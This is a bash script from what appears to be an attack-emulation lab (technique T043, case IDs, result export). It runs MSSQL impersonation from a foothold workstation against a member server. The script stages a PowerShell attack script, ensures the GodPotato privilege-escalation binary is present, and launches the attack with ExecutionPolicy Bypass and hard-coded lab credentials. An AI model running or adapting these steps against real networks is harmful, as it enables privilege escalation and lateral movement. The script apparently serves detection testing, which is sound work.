#!/usr/bin/env bash
# T043 — MSSQL impersonation from ws01
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T043-IMPERSON-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
MBR01="${MBR01:-192.168.77.22}"
PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t043-impersonate.ps1"
echo "=== T043 | ${CASE_ID} | T0=${T0} ==="

bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t043-impersonate.ps1"

# Ensure the LPE binary is present on the beachhead before copying it to mbr01.
ws01_ensure_lpe_binaries

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t043-impersonate.ps1 -Server ${MBR01} -ServerFqdn mbr01.child.cadre.local -Username 'child.cadre.local\\analyst_t1' -Password 'T13r_An@lyst!' -ToolSource 'C:\\Tools\\ADTools' -GpPath 'C:\\Windows\\Temp\\cadre-tools\\GodPotato.exe'"

cadre_export "${CASE_ID}" T043 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
